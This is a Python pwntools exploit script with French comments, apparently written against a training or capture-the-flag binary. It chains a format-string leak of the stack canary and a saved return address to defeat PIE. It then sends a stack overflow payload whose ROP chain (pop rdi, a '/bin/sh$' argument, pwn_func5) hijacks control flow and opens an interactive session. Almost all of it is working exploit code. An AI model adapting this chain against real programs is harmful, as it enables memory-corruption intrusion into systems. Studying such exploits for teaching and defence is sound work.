#!/usr/bin/env python3

import sys
import re
from pwn import *

# ICI LE PROBLEME EST QUE LE FLAG DE SECURITE PIE EST ACTIVE, DU COUP LA BASE ADRESSE EST RANDOMISER, MAIS TOUTES LES ADRESSES SONT TOUJOURS RELATIVE A CELLE-CI, SI NOUS RETROUVONS ET QUE NOUS METTONS A JOUR CETTE ADDRESS DANS PWNTOOLS, C EST COMME SI LE FLAG PIE EST DESACTIVE.

# ETAPES:
#
#  CONTOURNER LE CANARY:
#   ATTACHER GDB POUR RECUPERER: 
#   
#
#  CONTOURNER LE FLAG PIE:
#   ATTACHER GDB POUR RECUPERER: 
#    L ADRESSE ACTUELLE EN DYNAMIQUE
#    LA FONCTION ACTUELLE EN DYNAMIQUE
#    L OFFSET DE LA FONCTION ACTUELLE EN DYNAMIQUE
#
#   AVEC NM, RECUPERER L OFFSET DE LA FONCTION ACTUELLE RECUPERER AVEC GDB PAR RAPPORT A LA BASE ADRESSE
#
#   FAIRE LE CALCUL AFIN DE METTRE LA BASE ADDRESS A JOUR DANS PWNTOOLS
#
#   ET VOILA LA BASE ADRESSE EST A JOUR


# ORDRE DES ADDRESSES SUR LA STACK:
#SAVE_RIP
#RBP
#CANARI
#ARGUMENTS


exe = sys.argv[1]

def gdb_attach(io):
	gdb.attach(io.pid) #1/2 Permet de recuperer le printf parameter qui contient le canary  en manuel!
	pause() #2/2

def found_leak_idx(io):
	# FOUND LEAK IDX (43)

	for idx in range(1, 50):
		cmd=b'prints %' + bytes(str(idx), 'ascii') + b'$p'
		print(f"SEND >> {cmd}")
		io.sendline(cmd)
		io.recvuntil(b'Enter command: ')
		io.send(b'exec\n')
		out1=io.recvuntil(b'\n')
		print(f">> RECV1 {out1}")

def found_leak_canary_info(io):
	#LEAK CANARY INFO
	cmd=b'prints %43$p'# recupere le canari a l endroit ou l on a recuperer manuellement le printf parameter plus haut
	print(f"SEND >> {cmd}")#print le canari
	io.sendline(cmd)#ecris le canari dans l input utilisateur
	io.recvuntil(b'Enter command: ')#recupere la main apres que le programme a print cette string !
	io.send(b'exec\n')
	out1=io.recvuntil(b'\n')
	print(f">> RECV1 {out1}")
	m=re.match(rb'.*0x(?P<canary>[a-f0-9]+)',out1)
	if m is None:
		raise RuntimeError(f'FAILED REGEX')
	canary_str = m.groupdict()["canary"]
	print(f"CANARY STR {canary_str}")
	#canary_bytes = bytes.fromhex(str(canary_str, 'ascii'))
	#print(f"CANARY BYTES {canary_bytes}")
	canary_int = int(canary_str.decode('ascii'), 16)
	return canary_int

def found_leak_address(io):
	#LEAK ADDRESS
	cmd=b'prints %45$p'# recupere save_rip a l endroit ou l on a recuperer manuellement le printf parameter plus haut avec gdb donc l address de exec_instructions()+264
	print(f"SEND >> {cmd}")#print la retadr (save_rip)
	io.sendline(cmd)#ecris save_rip dans l input utilisateur
	io.recvuntil(b'Enter command: ')#recupere la main apres que le programme a print cette string !
	io.send(b'exec\n')
	out1=io.recvuntil(b'\n')
	print(f">> RECV1 {out1}")
	m=re.match(rb'.*0x(?P<retadr>[a-f0-9]+)',out1)
	if m is None:
		raise RuntimeError(f'FAILED REGEX')
	retadr_str = m.groupdict()["retadr"]
	print(f"RETADR STR {retadr_str}")
	retadr_int = int(retadr_str.decode('ascii'), 16)
	return retadr_int

def set_base_addr(elf, retadr_int):
	# COMPUTE ADDRESS
	exec_instructions = retadr_int - 264 # get by gdb # Address de la fonction exec_instructions en analyse dynamique
	raw_exec_instructions = elf.symbols['exec_instructions'] # Offset de la fonction exec_instructions en analyse statique
	base_addr = exec_instructions - raw_exec_instructions # Afin de remettre la base address au bonne endroit on fait le calcul:
	# (Adresse actuelle en dynamique avec potentiellement de la randomisation de la base address) - (offset de la fonction exec_instructions par rapport a la base address)
	print(f"ELF BASE ADDR {elf.address}")
	elf.address = base_addr # Met a jour l address de base dans pwntools pour avoir les symbols, la got, les functions, la plt, la ropchain que j ai fait ou que je ferait, les gadgets etc...
	print(f"ELF BASE ADDR {elf.address} WITH ASLR")

def list_all_gadgets(rop):
	gadgets = rop.gadgets
	for adresse, gadget in gadgets.items():
		print(hex(adresse), gadget)

def prepare_payload(elf, canary_int):
	#on est a exec_instructions+264 d apres gdb (recuperer avec le gdb attach)

	pwnfunc5 = elf.symbols['pwn_func5']
	print(f"FUNC5 : {pwnfunc5:x}")
	context.clear(arch='x86_64')
	rop = ROP(elf)

	#list_all_gadgets(rop)
	
	rdi = rop.rdi
	print(f"GADGET : {rdi}")

	#bin_sh_sequence = bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x24]) # b'/bin/sh$'
	#bin_sh_sequence = bytes([0x00, 0x68, 0x73, 0x2f, 0x6e, 0x69, 0x62, 0x2f]) # b'/bin/sh$'
	#bin_sh_sequence = bytes([ord('/'), ord('b'), ord('i'), ord('n'), ord('/'), ord('s'), ord('h'), ord('$')]) # b'/bin/sh$'

	payload = (b'prints '
		+ (b'\xff' * 264) #op1 #Regarder pk cet offset dans la video !# INDEX DU CANARY PAR RAPPORT A LA VARIABLE DE BASE SUR LEQUEL ON ECRIT ?
		#+ p64(int.from_bytes(canary_bytes, byteorder='big')) #CANARY
		+ p64(canary_int) #CANARY
		+ (b'\0' * 8) #RBP' (RBP PRIME)
		+ p64(rdi.address) #RIP -> POP RDI;RET #1/3 ROPCHAIN # POUR PLACER L ARGUMENT de pwn_func5 DANS RDI
		+ (b'/bin/sh$') #ARG -> RDI #2/3 ROPCHAIN # L'ARGUMENT QUE L ON VEUT METTRE DANS RDI POUR LA FONCTION pwn_func5
		#+ bin_sh_sequence #ARG -> RDI #2/3 ROPCHAIN
		+ p64(pwnfunc5) # RIP -> pwn_func5 #3/3 ROPCHAIN # L ADRESSE DE LA FONCTION pwn_func5 dans RIP
		+p64(0)
	)
	return payload

def send_payload(io):
	io.sendline(payload)
#	for index in range(1, 50): # 1/2 Trouver le printf parameter
#		io.sendline(b'prints %' + idx + '$p')#2/2
	io.sendline(payload)
	io.recvuntil(b'Enter command: ')
	io.send(b'exec\n')
	out1 = io.recvuntil(b'\n')
	print(f">> RECV! {out1}")
	if b'PWNED' in out1:
		io.interactive()
#	#out2 = io.recvuntil((b'Enter command: ', b'\n'))
#	#print(f">> RECV2 {out2}")

with open('/dev/null', 'wb') as err:
	io = process(exe, stderr=err)

	gdb_attach(io)

	#found_leak_idx(io)

	canary_int = found_leak_canary_info(io)
	print(f"CANARY INT {canary_int}")

	retadr_int = found_leak_address(io)
	print(f"RETADR INT {retadr_int}")

	elf = ELF(exe)

	set_base_addr(elf, retadr_int)

	payload=prepare_payload(elf, canary_int)
	print(f"PAYLOAD: {payload}")

	send_payload(io)
